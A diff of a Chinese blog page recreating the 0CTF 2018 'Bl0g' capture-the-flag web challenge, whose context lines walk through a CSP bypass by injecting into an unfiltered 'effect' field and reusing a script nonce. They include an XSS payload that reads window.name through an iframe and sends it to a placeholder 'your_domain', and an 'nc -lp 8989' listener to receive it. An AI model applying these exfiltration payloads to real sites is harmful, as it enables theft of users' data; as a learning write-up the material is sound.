@@ -115,10 +115,15 @@
 <meta property="og:site_name" content="cws6">
 <meta property="og:description" content="参考文献：https://lorexxar.cn/2018/04/05/0ctf2018-blog/         https://45.76.198.31/post/0CTF%202018%20Quals%20Bl0g%20writeup        CSP：https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-S">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-03T11:20:36.925Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-fc54e103f7e321db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-5f1401a481fc510c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-9b27e5bd3a97c569.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-e5c06e896b3c383c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-03T11:22:49.118Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="复现0ctf blog">
 <meta name="twitter:description" content="参考文献：https://lorexxar.cn/2018/04/05/0ctf2018-blog/         https://45.76.198.31/post/0CTF%202018%20Quals%20Bl0g%20writeup        CSP：https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-S">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5035860-fc54e103f7e321db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
 
@@ -381,7 +386,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-12-03 19:20:36" itemprop="dateModified" datetime="2018-12-03T19:20:36+08:00">2018-12-03</time>
+                <time title="Modified: 2018-12-03 19:22:49" itemprop="dateModified" datetime="2018-12-03T19:22:49+08:00">2018-12-03</time>
               
             
           </span>
@@ -432,7 +437,7 @@
 </li>
 <li><code>default-src &#39;none&#39;</code>定义针对所有类型（js、image、css、web font，ajax请求，iframe，多媒体等）资源的默认加载策略，某类型资源如果没有单独定义策略，就使用默认的。这其中包含了iframe-src，这代表攻击方式一定在站内实现<br>*<code>script-src</code>的双限制代表我们只能通过<code>&lt;script&gt;{eval_code}&lt;/script&gt;</code>的方式来实现攻击。</li>
 </ul>
-<p><strong>两个CSP分开写，是同时生效并且单独生效的，也就是与的关系。<br>换个说法就是，假设我们通过动态生成script标签的方式，成功绕过了第二个CSP，但我们引入了<script src="your.website">，就会被第一条CSP拦截。</strong></p>
+<p><strong>两个CSP分开写，是同时生效并且单独生效的，也就是与的关系。<br>换个说法就是，假设我们通过动态生成script标签的方式，成功绕过了第二个CSP，但我们引入了<code>&lt;script src=&quot;your.website&quot;&gt;</code>，就会被第一条CSP拦截。</strong></p>
 <p>②<strong>new中有一个字段是effect，是设置特效的</strong><br>effect字段会插入到页面中的<code>&lt;input type=&quot;hidden&quot; id=&quot;effect&quot; value=&quot;{effect_value}&quot;&gt;</code>，但这里实际上是没有任何过滤的，也就是说我们可以通过闭合这个标签并插入我们想要的标签，需要注意的是，这个点只能插入70个字符。<br><strong>config.js里定义了 effects 变量</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var effects = &#123;</span><br><span class="line">    &apos;nest&apos;: [</span><br><span class="line">        &apos;&lt;script src=&quot;/assets/js/effects/canvas-nest.min.js&quot;&gt;&lt;/script&gt;&apos;</span><br><span class="line">    ],</span><br><span class="line">    &apos;3waves&apos;: [</span><br><span class="line">        &apos;&lt;script src=&quot;/assets/js/effects/three.min.js&quot;&gt;&lt;/script&gt;&apos;,</span><br><span class="line">        &apos;&lt;script src=&quot;/assets/js/effects/three-waves.min.js&quot;&gt;&lt;/script&gt;&apos;</span><br><span class="line">    ],</span><br><span class="line">    &apos;lines&apos;: [</span><br><span class="line">        &apos;&lt;script src=&quot;/assets/js/effects/three.min.js&quot;&gt;&lt;/script&gt;&apos;,</span><br><span class="line">        &apos;&lt;script src=&quot;/assets/js/effects/canvas-lines.min.js&quot;&gt;&lt;/script&gt;&apos;</span><br><span class="line">    ],</span><br><span class="line">    &apos;sphere&apos;: [</span><br><span class="line">        &apos;&lt;script src=&quot;/assets/js/effects/three.min.js&quot;&gt;&lt;/script&gt;&apos;,</span><br><span class="line">        &apos;&lt;script src=&quot;/assets/js/effects/canvas-sphere.min.js&quot;&gt;&lt;/script&gt;&apos;</span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p><strong>article.js是取页面中 name=”effect” 元素的值作为 effects 的下标，通过 jQuery 的 append() 追加的页面中</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(function()&#123;</span><br><span class="line">    $(&quot;body&quot;).append((effects[$(&quot;#effect&quot;).val()]));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
 <p><strong>effects 是可以被我们劫持的：</strong><br><img src="https://upload-images.jianshu.io/upload_images/5035860-fc54e103f7e321db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a=&quot;</span><br><span class="line">&lt;script nonce=&quot;testtt&quot;&gt;...</span><br><span class="line">浏览器有一定的容错能力，他会补足不完整的标签</span><br><span class="line">=====&gt;</span><br><span class="line">&lt;script a=&quot;&lt;script&quot; nonce=&quot;test&quot;&gt;...</span><br></pre></td></tr></table></figure></p>
@@ -442,7 +447,7 @@
 <p><img src="https://upload-images.jianshu.io/upload_images/5035860-e5c06e896b3c383c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><strong>通过iframe 读取 window.name里的内容：</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://202.120.7.197:8090/article/3855&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    setTimeout(()=&gt;&#123;frames[0].window.location.href=&apos;/&apos;&#125;,1200)//当前页面打开URL页面</span><br><span class="line">    setTimeout(()=&gt;&#123;location.href=&apos;http://your_domain/?&apos;+frames[0].window.name&#125;,1500)//当前页面打开URL页面</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <p>最后nc连接查看：<code>nc -lp 8989</code></p>
-</script></strong></p>
+
       
     </div>
 
